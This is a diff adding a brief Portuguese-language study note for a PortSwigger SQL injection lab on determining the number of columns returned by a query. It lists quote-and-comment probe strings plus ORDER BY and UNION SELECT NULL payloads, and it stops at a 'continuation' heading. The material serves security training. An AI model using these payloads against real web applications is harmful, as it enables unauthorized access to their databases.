@@ -1,0 +1,26 @@
+\\Descobrindo o número de colunas//
+
+SQL injection UNION attack, determining the number of columns returned by the query
+
+Laboratório: https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns
+
+Testar caracteres:
+    |-> '
+    |-> '#
+    |-> '--
+
+----------------------------------------------------------------
+
+Determinar as colunas das tabelas:
+    'ORDER BY 1--
+    'ORDER BY 2--
+    'ORDER BY 3--
+
+----------------------------------------------------------------
+Determinar as colunas do primeiro select
+    'UNION SELECT NULL--
+        |-> Internal Server Error
+    'UNION SELECT NULL, NULL--
+    'UNION SELECT NULL, NULL, NULL--
+
+Continuação 
